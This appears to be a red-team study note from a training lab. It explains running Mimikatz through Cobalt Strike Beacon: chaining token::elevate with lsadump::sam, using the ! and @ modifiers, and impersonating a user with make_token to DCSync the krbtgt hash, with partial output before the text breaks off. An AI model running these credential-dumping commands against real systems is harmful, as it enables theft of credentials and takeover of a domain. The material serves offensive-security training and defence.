Check for [[Mimikatz]] for further information on the tool.
Cobalt Strike has a built-in version of Mimikatz that we can use to extract various credential types. ¬†However, there are some differences with how it behaves in Beacon compared to the console version. ¬†

Each time you execute Mimikatz in Beacon, it does so in a new temporary process which is then destroyed. ¬†This means you can't run two "related" commands, such as:

```
beacon> mimikatz token::elevate
beacon> mimikatz lsadump::sam
```
You need to chain them.

## üñäÔ∏è Command shortcuts

1) Since CS 4.8, you can chain multiple commands together by separating them with a semi-colon.

	`beacon> mimikatz token::elevate ; lsadump::sam`

Here, you are (from an elevate beacon session) elevating your token privileges to nt authority system and dumpling the SAM db.

2) Beacon also has its own command convention using the `!` and `@` symbols as "modifiers".

The `!` elevates Beacon to SYSTEM before running the given command, which is useful in cases where you're running in high-integrity but need to impersonate SYSTEM. ¬†In most cases, `!` is a direct replacement for `token::elevate`. For example:

	`beacon> mimikatz !lsadump::sam`

3) The `@` impersonates Beacon's thread token before running the given command, which is useful in cases where Mimikatz needs to interact with a remote system, such as with [[dcsync]]. ¬†This is also compatible with other impersonation primitives such as `make_token` and `steal_token`. ¬†For example:

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> make_token DEV\nlamb F3rrari
[+] Impersonated DEV\nlamb (netonly)

beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
